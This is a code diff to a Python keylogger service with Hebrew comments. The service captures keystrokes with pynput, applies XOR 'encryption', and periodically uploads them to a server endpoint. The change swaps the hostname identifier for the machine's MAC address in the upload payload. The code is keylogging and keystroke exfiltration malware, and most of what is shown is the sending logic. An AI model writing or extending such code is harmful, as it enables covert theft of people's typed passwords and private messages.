@@ -1,6 +1,5 @@
 from pynput import keyboard
 import requests
-import socket
 import threading
 import time
 import encryptor
@@ -32,12 +31,11 @@ class KeyLoggerService:
             listener.join()
 
 # שליחת הנתונים לשרת
-def send_to_server(encrypted_data):
-    machine_name = socket.gethostname()
+def send_to_server(encrypted_data, logger):
     url = "http://127.0.0.1:5000/api/upload"
     payload = {
-        "machine_name": machine_name,
-        "keystrokes": encrypted_data
+        "keystrokes": encrypted_data,
+        "mac_address": logger.ID_COMPUTER,
     }
 
     try:
@@ -53,7 +51,7 @@ def periodic_sender(logger, encryptor, interval=10):
         data = logger.get_buffer()
         if data:
             encrypted = encryptor.xor_encrypt(data)
-            send_to_server(encrypted)
+            send_to_server(encrypted, logger)
 
 # נקודת התחלה
 if __name__ == "__main__":
